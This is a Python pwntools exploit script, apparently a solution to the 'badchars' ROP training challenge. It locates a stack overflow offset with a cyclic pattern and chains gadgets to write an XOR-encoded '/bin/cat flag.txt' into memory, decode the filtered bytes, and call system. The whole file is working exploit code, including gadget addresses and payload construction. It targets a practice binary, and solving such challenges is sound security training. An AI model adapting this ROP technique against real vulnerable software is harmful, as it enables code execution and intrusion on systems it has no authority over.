#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template badchars
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('badchars')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

context.log_level = 'debug'
with open('cyclic.dat', 'wb') as out_file:
    out_file.write(cyclic(511))

io = process(exe.path)
io.sendline(cyclic(511))
io.wait()
core = io.corefile
stack = core.rsp
info("stack: %#x", stack)
pattern = core.read(stack, 4)
offset = cyclic_find(pattern)
info("pattern: %r", pattern)
info("offset:  %d", offset)


# CONSTANTS
system = 0x4009e8
pop_r12_r13 = 0x400b3b
mov_ptr_r13_r12 = 0x400b34
pop_rdi = 0x400b39
xor_ptr_r15_r14b = 0x400b30;
pop_r14_r15 = 0x400b40;

stuff_data = 0x601058
# this is the xor'd (with 0xff) version of 
# /bin/cat flag.txt
bin_cat_a = 0xd09d9691d09c9e8b
bin_cat_b = 0xdf99939e98d18b87
bin_cat_c = 0x8b00000000000000

# this version only xors the bad chars
bin_cat_a = 0xd09d9691d09c6174
bin_cat_b = 0xdf996c61672e7478
bin_cat_c = 0x7400000000000000

payload = fit({
    offset: [
        p64(pop_r12_r13),
        p64(bin_cat_a, endian="big"),
        p64(stuff_data),
        p64(mov_ptr_r13_r12),

        p64(pop_r14_r15),
        p64(0xff),
        p64(stuff_data),
        p64(xor_ptr_r15_r14b),

        p64(pop_r14_r15),
        p64(0xff),
        p64(stuff_data+1),
        p64(xor_ptr_r15_r14b),

        p64(pop_r14_r15),
        p64(0xff),
        p64(stuff_data+2),
        p64(xor_ptr_r15_r14b),

        p64(pop_r14_r15),
        p64(0xff),
        p64(stuff_data+3),
        p64(xor_ptr_r15_r14b),

        p64(pop_r14_r15),
        p64(0xff),
        p64(stuff_data+4),
        p64(xor_ptr_r15_r14b),

        p64(pop_r14_r15),
        p64(0xff),
        p64(stuff_data+5),
        p64(xor_ptr_r15_r14b),

        p64(pop_r12_r13),
        p64(bin_cat_b, endian="big"),
        p64(stuff_data+8),
        p64(mov_ptr_r13_r12),

        p64(pop_r14_r15),
        p64(0xff),
        p64(stuff_data+8),
        p64(xor_ptr_r15_r14b),

        p64(pop_r14_r15),
        p64(0xff),
        p64(stuff_data+9),
        p64(xor_ptr_r15_r14b),

        p64(pop_r12_r13),
        p64(bin_cat_c, endian="big"),
        p64(stuff_data+16),
        p64(mov_ptr_r13_r12),

        p64(pop_rdi),
        p64(stuff_data),
        p64(system)]
    })

with open("payload.dat", "wb") as out_file:
    out_file.write(payload)

io = process(exe.path)
io.sendline(payload)
io.wait_for_close()
lines = io.recv().decode().split("\n")
flag = None
for line in lines:
    if 'flag' in line:
        flag = line
        break
success(flag)


